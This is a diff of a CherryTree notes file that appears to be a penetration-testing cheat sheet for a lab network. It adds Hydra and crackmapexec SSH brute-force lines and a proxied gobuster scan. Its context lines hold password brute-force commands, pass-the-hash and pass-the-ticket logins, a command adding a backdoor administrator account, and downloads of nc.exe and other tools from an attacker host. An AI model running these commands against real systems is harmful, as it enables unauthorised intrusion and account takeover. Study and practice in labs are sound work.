@@ -129,7 +129,7 @@ Exploit POC:</rich_text>
       <rich_text link="node 32">ssh</rich_text>
       <node name="Brute Force" unique_id="57" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690629" ts_lastsave="1687690684">
         <rich_text> </rich_text>
-        <node name="Hydra" unique_id="58" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690629" ts_lastsave="1687690629">
+        <node name="Hydra" unique_id="58" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690629" ts_lastsave="1689800025">
           <rich_text underline="single" scale="h1">Hydra</rich_text>
           <rich_text>
 
@@ -139,7 +139,7 @@ Exploit POC:</rich_text>
           <rich_text underline="single" scale="h2">HTTP Basic Authentication</rich_text>
           <rich_text>
 </rich_text>
-          <rich_text family="monospace">hydra -l admin -V -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.0.1 http-get /phpmyadmin/ -t 15</rich_text>
+          <rich_text family="monospace">hydra -l admin -V -P /usr/share/wordlists/rockyou.txt -s 80 -f 10.11.1. http-get /phpmyadmin/ -t 15</rich_text>
           <rich_text>
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -148,7 +148,7 @@ Exploit POC:</rich_text>
           <rich_text underline="single" scale="h2">HTTP Get Request</rich_text>
           <rich_text>
 </rich_text>
-          <rich_text family="monospace">hydra 192.168.0.1 -V -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/rockyou.txt http-get-form "/login/:username=^USER^&amp;password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t 15</rich_text>
+          <rich_text family="monospace">hydra 10.11.1. -V -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/rockyou.txt http-get-form "/login/:username=^USER^&amp;password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t 15</rich_text>
           <rich_text>
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -163,7 +163,7 @@ Check request in BURP to see Post parameters. -l or -L has to be set, even if th
           <rich_text> for HTTPS sites.
 
 </rich_text>
-          <rich_text family="monospace">hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.1 http-post-form "/webapp/login.php:username=^USER^&amp;password=^PASS^:Invalid" -t 15</rich_text>
+          <rich_text family="monospace">hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.11.1. http-post-form "/webapp/login.php:username=^USER^&amp;password=^PASS^:Invalid" -t 15</rich_text>
           <rich_text>
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -174,10 +174,24 @@ Check request in BURP to see Post parameters. -l or -L has to be set, even if th
 Change MYDATABASENAME. Default databasename is mysql.
 
 </rich_text>
-          <rich_text family="monospace">hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -vv  mysql://192.168.0.1:3306/MYDATABASENAME -t 15</rich_text>
+          <rich_text family="monospace">hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -vv  mysql://10.11.1.:3306/MYDATABASENAME -t 15</rich_text>
           <rich_text>
 
+_______________________________________
+
+
+SSH
+
 </rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+
+or if that doesnt work
+
+</rich_text>
+          <codebox char_offset="1091" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://10.11.1.</codebox>
+          <codebox char_offset="1118" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec ssh 10.11.1. -u patrick -p /usr/share/wordlists/rockyou.txt
+</codebox>
         </node>
       </node>
       <node name="Shells" unique_id="59" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687691258">
@@ -1146,7 +1160,7 @@ echo ts.Close </rich_text>
           <rich_text family="monospace">cscript wget.vbs http://192.168.0.1/nc.exe nc.exe</rich_text>
         </node>
       </node>
-      <node name="gobuster" unique_id="31" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684772533" ts_lastsave="1688759612">
+      <node name="gobuster" unique_id="31" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684772533" ts_lastsave="1689625596">
         <rich_text scale="h1">Directory BF
 </rich_text>
         <rich_text>
@@ -1176,9 +1190,19 @@ echo ts.Close </rich_text>
         <rich_text justification="left"></rich_text>
         <rich_text>
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+_______________________________________
+
+</rich_text>
+        <rich_text scale="h2">Using Proxy:
+</rich_text>
+        <rich_text>
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
 
 
+
+________________________________________
 
 </rich_text>
         <rich_text scale="h2">HTTPS</rich_text>
@@ -1190,6 +1214,7 @@ To ignore ssl certificate use </rich_text>
         <codebox char_offset="38" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://10.11.1. -w /usr/share/wordlists/dirb/big.txt -t 20 -o gobuster.log</codebox>
         <codebox char_offset="64" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://10.11.1. -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster.log</codebox>
         <codebox char_offset="103" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://10.11.1. -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,cgi,sh,bak,aspx -t 20 -o gobuster.log</codebox>
+        <codebox char_offset="161" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir --proxy http://10.11.1.:3128 -e -u http://10.11.1. -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster.log</codebox>
       </node>
       <node name="ssh" unique_id="32" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684867617" ts_lastsave="1687291548">
         <rich_text scale="h2">SSH</rich_text>
@@ -1613,7 +1638,7 @@ with mimikatz
           <codebox char_offset="3" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.11.1. -u Administrator -H 0e0363213e37b94221497260b0bcb4fc</codebox>
           <codebox char_offset="10" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  domain.local/admin@10.11.1. -hashes randomLMHASH:oeasdNTLMHASH</codebox>
         </node>
-        <node name="Useful Powershell/CMD Commands" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689661" ts_lastsave="1689474300">
+        <node name="Useful Powershell/CMD Commands" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689661" ts_lastsave="1689474415">
           <rich_text>
 </rich_text>
           <rich_text scale="h2">
@@ -1639,6 +1664,7 @@ _______________________________________________________
 </rich_text>
           <rich_text justification="left"></rich_text>
           <rich_text>
+or
 
 </rich_text>
           <rich_text scale="h3">Adding use to Admin group</rich_text>
@@ -1656,7 +1682,9 @@ _________________________________________________________
           <rich_text>
 To downoad files:
 
-
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
 
 pr
 </rich_text>
@@ -1774,14 +1802,14 @@ where ptt is pass the ticket
 </rich_text>
           <codebox char_offset="37" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose</codebox>
           <codebox char_offset="125" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">net user cel1s0 pass123 /add</codebox>
-          <codebox char_offset="155" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">net localgroup administrators cel1s0 /add</codebox>
-          <codebox char_offset="295" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Invoke-WebRequest http://10.11.1./GMSAPasswordReader.exe -OutFile GMSA.exe</codebox>
-          <codebox char_offset="301" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
+          <codebox char_offset="158" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">net localgroup administrators cel1s0 /add</codebox>
+          <codebox char_offset="298" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Invoke-WebRequest http://10.11.1./GMSAPasswordReader.exe -OutFile GMSA.exe</codebox>
+          <codebox char_offset="304" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
 $wc = New-Object Net.WebClient
 $wc.DownloadString("http://10.11.1.  whatever else u want with space")
 </codebox>
-          <codebox char_offset="663" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gpupdate /force</codebox>
-          <codebox char_offset="785" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">Test-NetConnection -ComputerName YouComputerName -Port 389
+          <codebox char_offset="666" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gpupdate /force</codebox>
+          <codebox char_offset="788" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">Test-NetConnection -ComputerName YouComputerName -Port 389
 or
 
 # Test if HTTP port is open
@@ -1789,15 +1817,15 @@ Test-NetConnection google.com -CommonTCPPort "Http"
 
 # Or define a port number
 Test-NetConnection google.com -Port 80</codebox>
-          <codebox char_offset="869" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="dosbatch" highlight_brackets="1" show_line_numbers="0">runas /user:corp\server_admin "C:\Windows\system32\notepad.exe C:\ps\region.txt"
+          <codebox char_offset="872" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="dosbatch" highlight_brackets="1" show_line_numbers="0">runas /user:corp\server_admin "C:\Windows\system32\notepad.exe C:\ps\region.txt"
 
 or  like ippsec writeup
 
 runas /netonly /user:domain.local\user cmd
 </codebox>
-          <codebox char_offset="1654" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\Rubeus.exe asktgt /user:Administrator /rc4:b73fdfe10e87b4ca5c0d957f81de6863 /ptt</codebox>
-          <codebox char_offset="1664" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">mimikatz # kerberos::ptt</codebox>
-          <codebox char_offset="1709" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Enter-PSSession -ComputerName dc01</codebox>
+          <codebox char_offset="1657" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\Rubeus.exe asktgt /user:Administrator /rc4:b73fdfe10e87b4ca5c0d957f81de6863 /ptt</codebox>
+          <codebox char_offset="1667" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">mimikatz # kerberos::ptt</codebox>
+          <codebox char_offset="1712" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Enter-PSSession -ComputerName dc01</codebox>
           <node name="Getting a Shell from password" unique_id="92" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688943845" ts_lastsave="1688943934">
             <rich_text scale="h2">First, let's restart out Netcat listener.</rich_text>
             <rich_text>
